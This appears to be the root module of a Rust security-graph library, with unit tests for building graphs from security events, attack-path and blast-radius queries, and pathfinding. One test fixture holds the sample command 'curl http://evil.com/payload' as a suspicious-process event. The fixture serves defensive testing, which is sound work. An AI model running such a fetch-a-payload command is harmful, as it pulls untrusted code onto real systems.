pub mod models;
pub mod memory_graph;
pub mod ingest;
pub mod query;
pub mod pathfinding;
pub mod errors;

pub use models::*;
pub use memory_graph::MemoryGraph;
pub use ingest::GraphIngester;
pub use query::{GraphQuerier, AttackPath, BlastRadius};
pub use pathfinding::Pathfinder;
pub use errors::{GraphError, Result};

#[cfg(test)]
mod tests {
    use std::collections::HashMap;
    use std::sync::Arc;

    use uuid::Uuid;

    use security_os_core::{
        EventAction, EventCategory, EventSource, SecurityEvent,
    };

    use crate::memory_graph::MemoryGraph;
    use crate::models::{
        EdgeRelationship, GraphEdge, GraphNode, NodeType,
    };
    use crate::ingest::GraphIngester;
    use crate::pathfinding::Pathfinder;
    use crate::query::GraphQuerier;

    fn make_source() -> EventSource {
        EventSource {
            collector: "test".into(),
            host_id: "host-1".into(),
            host_name: "web-01".into(),
            agent_id: "agent-1".into(),
            agent_version: Some("1.0".into()),
            process_name: None,
            process_id: None,
            user_id: Some("uid-1000".into()),
            user_name: Some("alice".into()),
            container_id: None,
            container_name: None,
            pod_name: None,
            namespace: None,
            service_name: None,
        }
    }

    // ─── Models ───────────────────────────────────────────────────────────────

    #[test]
    fn test_node_construction() {
        let mut props = HashMap::new();
        props.insert("key".into(), serde_json::Value::String("val".into()));
        let mut node = GraphNode::new(NodeType::Host, "web-01");
        node.properties = props;
        node.risk_score = 85.0;
        assert_eq!(node.node_type, NodeType::Host);
        assert_eq!(node.label, "web-01");
        assert_eq!(node.event_count, 1);
        assert_eq!(node.risk_score, 85.0);
        assert_eq!(
            node.properties.get("key").unwrap(),
            &serde_json::Value::String("val".into())
        );
        assert_eq!(node.type_key(), "Host");
    }

    #[test]
    fn test_edge_construction() {
        let src = Uuid::new_v4();
        let tgt = Uuid::new_v4();
        let edge = GraphEdge::new(src, tgt, EdgeRelationship::Communicates, 0.75);
        assert_eq!(edge.source_id, src);
        assert_eq!(edge.target_id, tgt);
        assert_eq!(edge.relationship, EdgeRelationship::Communicates);
        assert!((edge.weight - 0.75).abs() < f64::EPSILON);
        assert_eq!(edge.event_count, 1);
        assert_eq!(edge.relationship_key(), "COMMUNICATES");
    }

    #[test]
    fn test_graph_stats_empty() {
        let graph = MemoryGraph::new();
        let stats = graph.stats();
        assert_eq!(stats.total_nodes, 0);
        assert_eq!(stats.total_edges, 0);
        assert_eq!(stats.avg_degree, 0.0);
    }

    #[test]
    fn test_graph_stats_populated() {
        let graph = Arc::new(MemoryGraph::new());
        let n1 = GraphNode::new(NodeType::Host, "h1");
        let n2 = GraphNode::new(NodeType::Host, "h2");
        let n3 = GraphNode::new(NodeType::User, "u1");
        let id1 = graph.add_node(n1);
        let id2 = graph.add_node(n2);
        let id3 = graph.add_node(n3);
        graph.add_edge(GraphEdge::new(id1, id2, EdgeRelationship::Connected, 1.0));
        graph.add_edge(GraphEdge::new(id3, id1, EdgeRelationship::Authenticated, 0.8));

        let stats = graph.stats();
        assert_eq!(stats.total_nodes, 3);
        assert_eq!(stats.total_edges, 2);
        assert_eq!(*stats.nodes_by_type.get("Host").unwrap(), 2);
        assert_eq!(*stats.nodes_by_type.get("User").unwrap(), 1);
        assert_eq!(*stats.edges_by_type.get("CONNECTED").unwrap(), 1);
        assert_eq!(*stats.edges_by_type.get("AUTHENTICATED").unwrap(), 1);
        assert!((stats.avg_degree - (4.0 / 3.0)).abs() < 0.01);
    }

    // ─── MemoryGraph ──────────────────────────────────────────────────────────

    #[test]
    fn test_add_and_get_node() {
        let graph = MemoryGraph::new();
        let node = GraphNode::new(NodeType::Host, "srv-01");
        let id = node.id;
        graph.add_node(node);
        let got = graph.get_node(&id).expect("node should exist");
        assert_eq!(got.label, "srv-01");
        assert_eq!(got.node_type, NodeType::Host);
    }

    #[test]
    fn test_find_node_by_label() {
        let graph = MemoryGraph::new();
        graph.add_node(GraphNode::new(NodeType::User, "bob"));
        assert!(graph.find_node_by_label("bob").is_some());
        assert!(graph.find_node_by_label("nobody").is_none());
    }

    #[test]
    fn test_find_nodes_by_type() {
        let graph = MemoryGraph::new();
        graph.add_node(GraphNode::new(NodeType::Host, "h1"));
        graph.add_node(GraphNode::new(NodeType::Host, "h2"));
        graph.add_node(GraphNode::new(NodeType::User, "u1"));
        let hosts = graph.find_nodes_by_type(&NodeType::Host);
        assert_eq!(hosts.len(), 2);
        let users = graph.find_nodes_by_type(&NodeType::User);
        assert_eq!(users.len(), 1);
        let pods = graph.find_nodes_by_type(&NodeType::Pod);
        assert_eq!(pods.len(), 0);
    }

    #[test]
    fn test_add_and_get_edges() {
        let graph = MemoryGraph::new();
        let id1 = graph.add_node(GraphNode::new(NodeType::Host, "h1"));
        let id2 = graph.add_node(GraphNode::new(NodeType::Ip, "ip:10.0.0.1"));
        let edge = GraphEdge::new(id1, id2, EdgeRelationship::Connected, 1.0);
        graph.add_edge(edge);

        let from_edges = graph.get_edges_from(&id1);
        assert_eq!(from_edges.len(), 1);
        assert_eq!(from_edges[0].target_id, id2);

        let to_edges = graph.get_edges_to(&id2);
        assert_eq!(to_edges.len(), 1);
        assert_eq!(to_edges[0].source_id, id1);
    }

    #[test]
    fn test_neighbors_bidirectional() {
        let graph = MemoryGraph::new();
        let id1 = graph.add_node(GraphNode::new(NodeType::Host, "h1"));
        let id2 = graph.add_node(GraphNode::new(NodeType::User, "u1"));
        let id3 = graph.add_node(GraphNode::new(NodeType::Process, "p1"));
        graph.add_edge(GraphEdge::new(id1, id2, EdgeRelationship::Started, 1.0));
        graph.add_edge(GraphEdge::new(id3, id1, EdgeRelationship::Started, 1.0));

        let neighbors = graph.neighbors(&id1);
        assert_eq!(neighbors.len(), 2);
        let labels: Vec<&str> = neighbors.iter().map(|n| n.label.as_str()).collect();
        assert!(labels.contains(&"u1"));
        assert!(labels.contains(&"p1"));
    }

    #[test]
    fn test_remove_node_cleans_edges() {
        let graph = MemoryGraph::new();
        let id1 = graph.add_node(GraphNode::new(NodeType::Host, "h1"));
        let id2 = graph.add_node(GraphNode::new(NodeType::Ip, "ip:1.2.3.4"));
        graph.add_edge(GraphEdge::new(id1, id2, EdgeRelationship::Connected, 1.0));
        assert_eq!(graph.edge_count(), 1);

        assert!(graph.remove_node(&id1));
        assert_eq!(graph.node_count(), 1);
        assert_eq!(graph.edge_count(), 0);
        assert!(graph.get_node(&id1).is_none());
        assert!(graph.find_node_by_label("h1").is_none());
    }

    #[test]
    fn test_remove_edge() {
        let graph = MemoryGraph::new();
        let id1 = graph.add_node(GraphNode::new(NodeType::Host, "h1"));
        let id2 = graph.add_node(GraphNode::new(NodeType::User, "u1"));
        let edge = GraphEdge::new(id1, id2, EdgeRelationship::Authenticated, 0.5);
        let eid = edge.id;
        graph.add_edge(edge);
        assert_eq!(graph.edge_count(), 1);

        assert!(graph.remove_edge(&eid));
        assert_eq!(graph.edge_count(), 0);
        assert!(graph.get_edges_from(&id1).is_empty());
        assert!(graph.get_edges_to(&id2).is_empty());
    }

    #[test]
    fn test_type_index_tracks_nodes() {
        let graph = MemoryGraph::new();
        let id1 = graph.add_node(GraphNode::new(NodeType::Container, "c1"));
        let id2 = graph.add_node(GraphNode::new(NodeType::Container, "c2"));
        graph.add_node(GraphNode::new(NodeType::Pod, "pod-1"));
        graph.add_node(GraphNode::new(NodeType::Namespace, "default"));

        let containers = graph.find_nodes_by_type(&NodeType::Container);
        assert_eq!(containers.len(), 2);

        assert!(graph.remove_node(&id1));
        let containers = graph.find_nodes_by_type(&NodeType::Container);
        assert_eq!(containers.len(), 1);
        assert_eq!(containers[0].id, id2);
    }

    // ─── Ingest ───────────────────────────────────────────────────────────────

    fn make_network_event() -> SecurityEvent {
        let mut event = SecurityEvent::new(
            EventCategory::Network,
            EventAction::Connected,
            make_source(),
            "Network connection",
            "Outbound connection to external IP",
        );
        event.risk_score = 42.0;
        event.src_ip = Some("10.0.0.1".into());
        event.dst_ip = Some("203.0.113.5".into());
        event.src_port = Some(443);
        event.dst_port = Some(8080);
        event
    }

    fn make_process_event() -> SecurityEvent {
        let mut event = SecurityEvent::new(
            EventCategory::Process,
            EventAction::Executed,
            make_source(),
            "Suspicious process",
            "Process spawned with unusual arguments",
        );
        event.risk_score = 75.0;
        event.pid = Some(12345);
        event.exe = Some("/usr/bin/curl".into());
        event.cmdline = Some("curl http://evil.com/payload".into());
        event
    }

    fn make_business_event() -> SecurityEvent {
        let mut event = SecurityEvent::new(
            EventCategory::ReservatiorBusiness,
            EventAction::Created,
            make_source(),
            "Booking created",
            "New booking with suspicious pattern",
        );
        event.risk_score = 90.0;
        event.business_context = Some("booking-escrow-transfer".into());
        event.revenue_impact = Some(5000.0);
        event
    }

    #[test]
    fn test_ingest_network_event() {
        let graph = Arc::new(MemoryGraph::new());
        let ingester = GraphIngester::new(graph.clone());
        let event = make_network_event();
        let edges = ingester.ingest_event(&event);

        assert!(graph.node_count() >= 3, "should create host, src_ip, dst_ip nodes");
        assert!(!edges.is_empty(), "should create edges between entities");
        assert!(
            graph.find_node_by_label("host-1").is_some(),
            "host node should exist"
        );
        assert!(
            graph.find_node_by_label("ip:10.0.0.1").is_some(),
            "src IP node should exist"
        );
        assert!(
            graph.find_node_by_label("ip:203.0.113.5").is_some(),
            "dst IP node should exist"
        );
    }

    #[test]
    fn test_ingest_process_event() {
        let graph = Arc::new(MemoryGraph::new());
        let ingester = GraphIngester::new(graph.clone());
        let event = make_process_event();
        ingester.ingest_event(&event);

        assert!(graph.node_count() >= 3, "should create host, user, process nodes");
        let process_node = graph.find_node_by_label("/usr/bin/curl:12345");
        assert!(process_node.is_some(), "process node should be labeled exe:pid");
        let node = process_node.unwrap();
        assert_eq!(node.node_type, NodeType::Process);
        assert_eq!(
            node.properties.get("exe").unwrap(),
            &serde_json::Value::String("/usr/bin/curl".into())
        );
    }

    #[test]
    fn test_ingest_business_event() {
        let graph = Arc::new(MemoryGraph::new());
        let ingester = GraphIngester::new(graph.clone());
        let event = make_business_event();
        ingester.ingest_event(&event);

        assert!(graph.node_count() >= 2, "should create host and business nodes");
        let biz_node = graph.find_node_by_label("booking-escrow-transfer");
        assert!(biz_node.is_some(), "business context node should exist");
        let node = biz_node.unwrap();
        assert!(
            matches!(
                node.node_type,
                NodeType::Booking | NodeType::Escrow | NodeType::Payment
            ),
            "business node should have correct type"
        );
    }

    #[test]
    fn test_ingest_creates_edges() {
        let graph = Arc::new(MemoryGraph::new());
        let ingester = GraphIngester::new(graph.clone());
        let event = make_network_event();
        let edges = ingester.ingest_event(&event);

        assert!(!edges.is_empty());
        let host = graph.find_node_by_label("host-1").unwrap();
        let host_edges = graph.get_edges_from(&host.id);
        assert!(
            !host_edges.is_empty(),
            "host node should have outgoing edges"
        );
        assert!(
            host_edges
                .iter()
                .any(|e| e.relationship == EdgeRelationship::Connected),
            "should have CONNECTED edge from host"
        );
    }

    #[test]
    fn test_ingest_dedup_updates_node() {
        let graph = Arc::new(MemoryGraph::new());
        let ingester = GraphIngester::new(graph.clone());

        let mut event1 = make_process_event();
        event1.pid = Some(999);
        event1.exe = Some("/usr/bin/ls".into());
        ingester.ingest_event(&event1);
        assert_eq!(graph.node_count(), 3);

        let mut event2 = make_process_event();
        event2.pid = Some(999);
        event2.exe = Some("/usr/bin/ls".into());
        ingester.ingest_event(&event2);
        assert_eq!(graph.node_count(), 3, "should not create duplicate nodes");

        let proc = graph.find_node_by_label("/usr/bin/ls:999").unwrap();
        assert_eq!(proc.event_count, 2, "event_count should be incremented");
    }

    // ─── Query ────────────────────────────────────────────────────────────────

    #[test]
    fn test_attack_paths() {
        let graph = Arc::new(MemoryGraph::new());
        let h1 = graph.add_node(GraphNode::new(NodeType::Host, "h1"));
        let h2 = graph.add_node(GraphNode::new(NodeType::Host, "h2"));
        let h3 = graph.add_node(GraphNode::new(NodeType::Host, "h3"));
        graph.add_edge(GraphEdge::new(h1, h2, EdgeRelationship::Connected, 0.5));
        graph.add_edge(GraphEdge::new(h2, h3, EdgeRelationship::Communicates, 0.8));
        graph.add_edge(GraphEdge::new(h1, h3, EdgeRelationship::Connected, 0.3));

        let querier = GraphQuerier::new(graph);
        let paths = querier.find_attack_paths(&h1, &h3, 5);
        assert!(!paths.is_empty(), "should find at least one attack path");
        let best = &paths[0];
        assert_eq!(best.nodes.first().unwrap().id, h1);
        assert_eq!(best.nodes.last().unwrap().id, h3);
    }

    #[test]
    fn test_blast_radius() {
        let graph = Arc::new(MemoryGraph::new());
        let h1 = graph.add_node(GraphNode::new(NodeType::Host, "h1"));
        let h2 = graph.add_node(GraphNode::new(NodeType::Host, "h2"));
        let h3 = graph.add_node(GraphNode::new(NodeType::User, "u1"));
        graph.add_edge(GraphEdge::new(h1, h2, EdgeRelationship::Connected, 1.0));
        graph.add_edge(GraphEdge::new(h1, h3, EdgeRelationship::Authenticated, 0.5));

        let querier = GraphQuerier::new(graph);
        let blast = querier.calculate_blast_radius(&h1, 3);
        assert_eq!(blast.affected_nodes.len(), 2);
        assert!(!blast.affected_edges.is_empty());
        assert!(blast.total_risk > 0.0);
    }

    #[test]
    fn test_find_high_risk_nodes() {
        let graph = Arc::new(MemoryGraph::new());
        let mut safe = GraphNode::new(NodeType::Host, "safe-host");
        safe.risk_score = 10.0;
        graph.add_node(safe);
        let mut risky = GraphNode::new(NodeType::Host, "risky-host");
        risky.risk_score = 90.0;
        graph.add_node(risky);
        let mut critical = GraphNode::new(NodeType::User, "admin");
        critical.risk_score = 95.0;
        graph.add_node(critical);

        let querier = GraphQuerier::new(graph);
        let high_risk = querier.find_high_risk_nodes(50.0);
        assert_eq!(high_risk.len(), 2);
        assert!(high_risk.iter().all(|n| n.risk_score >= 50.0));
    }

    // ─── Pathfinding ──────────────────────────────────────────────────────────

    #[test]
    fn test_bfs_finds_shortest_path() {
        let graph = MemoryGraph::new();
        let n1 = graph.add_node(GraphNode::new(NodeType::Host, "a"));
        let n2 = graph.add_node(GraphNode::new(NodeType::Host, "b"));
        let n3 = graph.add_node(GraphNode::new(NodeType::Host, "c"));
        let n4 = graph.add_node(GraphNode::new(NodeType::Host, "d"));
        graph.add_edge(GraphEdge::new(n1, n2, EdgeRelationship::Connected, 1.0));
        graph.add_edge(GraphEdge::new(n2, n3, EdgeRelationship::Connected, 1.0));
        graph.add_edge(GraphEdge::new(n3, n4, EdgeRelationship::Connected, 1.0));

        let pathfinder = Pathfinder::new(&graph);
        let path = pathfinder.bfs(&n1, &n4, 10);
        assert!(path.is_some());
        let path = path.unwrap();
        assert_eq!(path.len(), 4);
        assert_eq!(path[0], n1);
        assert_eq!(path[3], n4);
    }

    #[test]
    fn test_dijkstra_weighted_path() {
        let graph = MemoryGraph::new();
        let n1 = graph.add_node(GraphNode::new(NodeType::Host, "a"));
        let n2 = graph.add_node(GraphNode::new(NodeType::Host, "b"));
        let n3 = graph.add_node(GraphNode::new(NodeType::Host, "c"));
        graph.add_edge(GraphEdge::new(n1, n2, EdgeRelationship::Connected, 1.0));
        graph.add_edge(GraphEdge::new(n2, n3, EdgeRelationship::Communicates, 2.0));
        graph.add_edge(GraphEdge::new(n1, n3, EdgeRelationship::Connected, 5.0));

        let pathfinder = Pathfinder::new(&graph);
        let result = pathfinder.dijkstra(&n1, &n3, 10);
        assert!(result.is_some());
        let (path, cost) = result.unwrap();
        assert_eq!(path.len(), 3, "should go through b for cheaper path");
        assert!((cost - 3.0).abs() < 0.01, "total cost should be ~3.0");
    }

    #[test]
    fn test_reachable_from() {
        let graph = MemoryGraph::new();
        let n1 = graph.add_node(GraphNode::new(NodeType::Host, "a"));
        let n2 = graph.add_node(GraphNode::new(NodeType::Host, "b"));
        let n3 = graph.add_node(GraphNode::new(NodeType::Host, "c"));
        let n4 = graph.add_node(GraphNode::new(NodeType::Host, "d"));
        graph.add_edge(GraphEdge::new(n1, n2, EdgeRelationship::Connected, 1.0));
        graph.add_edge(GraphEdge::new(n2, n3, EdgeRelationship::Connected, 1.0));
        graph.add_edge(GraphEdge::new(n3, n4, EdgeRelationship::Connected, 1.0));

        let pathfinder = Pathfinder::new(&graph);
        let reachable_depth1 = pathfinder.reachable_from(&n1, 1);
        assert_eq!(reachable_depth1.len(), 1, "depth 1: only b reachable");
        assert!(reachable_depth1.contains(&n2));

        let reachable_depth3 = pathfinder.reachable_from(&n1, 3);
        assert_eq!(reachable_depth3.len(), 3, "depth 3: b, c, d reachable");
        assert!(reachable_depth3.contains(&n2));
        assert!(reachable_depth3.contains(&n3));
        assert!(reachable_depth3.contains(&n4));
    }
}
